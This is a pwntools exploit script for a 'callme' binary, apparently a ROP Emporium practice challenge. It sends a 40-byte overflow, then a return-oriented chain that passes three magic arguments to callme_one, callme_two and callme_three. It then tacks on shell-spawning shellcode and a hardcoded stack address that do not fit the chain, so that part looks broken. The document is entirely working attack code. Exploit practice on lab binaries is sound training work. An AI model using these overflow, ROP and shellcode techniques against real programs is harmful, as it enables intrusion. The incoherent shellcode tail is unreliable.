from pwn import *

context.binary = ELF('./callme')
p = process("./callme")

POP_RDI_RSI_RDX = 0x40093c         # pop rdi; pop rsi; pop rdx; ret
CALLME_ONE = 0x400720
CALLME_TWO = 0x400740
CALLME_THREE = 0x4006f0

payload = b'A' * 40
payload += p64(POP_RDI_RSI_RDX)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(CALLME_ONE)

payload += p64(POP_RDI_RSI_RDX)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(CALLME_TWO)

payload += p64(POP_RDI_RSI_RDX)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(CALLME_THREE)

payload += asm(shellcraft.sh())
payload += p64(0x7fffffffdbc0)

log.info(p.clean())
p.sendline(payload)
p.interactive()
